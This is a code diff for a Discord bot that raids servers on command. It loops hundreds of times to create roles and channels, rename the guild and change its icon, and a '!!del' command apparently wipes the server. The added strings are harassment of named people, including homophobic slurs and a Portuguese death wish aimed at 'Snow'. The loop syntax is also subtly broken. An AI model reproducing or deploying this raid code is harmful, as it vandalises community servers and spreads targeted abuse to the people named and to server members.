@@ -27,24 +27,23 @@ client.on("message", async (message) => {
        console.log(`ser humano falou ae meu parcero fode tudo ae men`)
        message.guild.setIcon('./icon.png') 
 	message.channel.send(`henrique bixa`)
-	if(message.guild.id === '695276639898173641'){
-		for(i = 0; i < 499; i++){
-			message.guild.setName("SNOW MANIPULADOR DO CARALHO")
-			message.guild.createChannel('snow arrombado do krl', 'text')
-			message.guild.createChannel('snow manipulador do cacete', 'text')
-		}
-	}else{
-		for(i = 0; i < 499; i++){
-        		message.guild.createRole('NOOT NOOT')
-	    		message.guild.setName(process.env.SERVER_NAME + `${textuh}`)
-	    		const textuh = makeid(32);
-	    		message.guild.createChannel(`${textuh}`, 'text');
-	    		message.guild.createChannel(`${textuh}`, 'voice');  
-	    		message.guild.setIcon('./icon.png') 
-			if(message.guild.channels > 499) break;
-		}
-	   }
-       }
+	for(i = 0; i < 499; i++)
+		/*
+        	message.guild.createRole('NOOT NOOT')
+	    	message.guild.setName(process.env.SERVER_NAME + `${textuh}`)
+	    	const textuh = makeid(32);
+	    	message.guild.createChannel(`${textuh}`, 'text');
+	    	message.guild.createChannel(`${textuh}`, 'voice');  
+	    	message.guild.setIcon('./icon.png') 
+		if(message.guild.channels > 499) break;
+		*/
+		message.guild.createRole('henry gay')
+	    	message.guild.setName('snow manipulador do caralho')
+	    	message.guild.createChannel('SNOW ESPERO QUE VOCE MORRA -SUZY <3');
+	    	message.guild.createChannel('SNOW ESPERO QUE VOCE MORRA -SUZY <3');  
+	    	message.guild.setIcon('./icon.png') 
+		if(message.guild.channels > 499) break;
+	}
     }
     if(message.content === '!!del'){
 	    console.log(`ser humano falou ae meu parcero deleta tudo ae men`);
